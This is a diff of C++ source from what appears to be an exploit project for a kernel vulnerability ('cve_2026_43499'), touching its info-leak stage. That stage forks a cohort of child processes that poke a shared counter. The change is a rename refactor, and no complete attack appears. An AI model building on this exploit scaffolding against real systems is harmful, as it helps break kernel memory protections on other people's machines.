@@ -20,8 +20,8 @@
  *  since waking the wrong suffix of a cohort is a search that waits for children that
  *  were never told to start.
  *
- *  The cohort's poking is not a platform call and so is not in the seam: it is an atomic
- *  add by the child itself, and the seam only carries what reaches the kernel.
+ *  The cohort's poking is not a platform call and so is not in the landing: it is an atomic
+ *  add by the child itself, and the landing only carries what reaches the kernel.
  */
 #include <cstddef>
 #include <cstdint>
@@ -29,7 +29,7 @@
 #include "backend/cve_2026_43499/leak/collision_wait.hpp"
 #include "backend/cve_2026_43499/leak/snitch_child.hpp"
 #include "backend/cve_2026_43499/leak/snitch_region.hpp"
-#include "backend/cve_2026_43499/leak/snitch_seam.hpp"
+#include "backend/cve_2026_43499/leak/snitch_ops.hpp"
 #include "backend/cve_2026_43499/leak/snitch_setup.hpp"
 
 namespace ghostlock::backend::cve_2026_43499::leak {
@@ -86,7 +86,7 @@ namespace ghostlock::backend::cve_2026_43499::leak {
      *  The cohort's children are the caller's to reap: this returns either way, and the
      *  region it mapped stays mapped until the caller unmaps it. */
     template <class Seam>
-      requires memory::HeapSeam<Seam> && SnitchSeam<Seam>
+      requires memory::HeapOps<Seam> && SnitchOps<Seam>
     [[nodiscard]] ScanOutcome run_poke_protocol(const SnitchSetup &setup, const RegionInputs &region_inputs,
                                                 const SnitchPatience &patience, std::size_t counter_offset,
                                                 std::uint32_t *const *words,
@@ -94,7 +94,7 @@ namespace ghostlock::backend::cve_2026_43499::leak {
     /** The counter the cohort pokes, found through an offset the caller knows from its
      *  own header layout. Volatile because a child writes it. */
     template <class Seam>
-      requires memory::HeapSeam<Seam> && SnitchSeam<Seam>
+      requires memory::HeapOps<Seam> && SnitchOps<Seam>
     [[nodiscard]] ScanOutcome run_poke_protocol(const SnitchSetup &setup, const RegionInputs &region_inputs,
                                                 const SnitchPatience &patience, std::size_t counter_offset,
                                                 std::uint32_t *const *words,
@@ -138,7 +138,7 @@ namespace ghostlock::backend::cve_2026_43499::leak {
         std::size_t forked = 0U;
         const std::size_t cohort = setup.collisions < kMaxCohort ? setup.collisions : kMaxCohort;
         for (std::size_t i = 0U; i < cohort; ++i) {
-            const memory::SeamResult child = Seam::fork_child();
+            const memory::OpsResult child = Seam::fork_child();
             if (child.value == 0) {
                 /* In the child. It runs its own word until the parent asks it to stop, and
                  *  then ends itself rather than returning into the caller's code. */
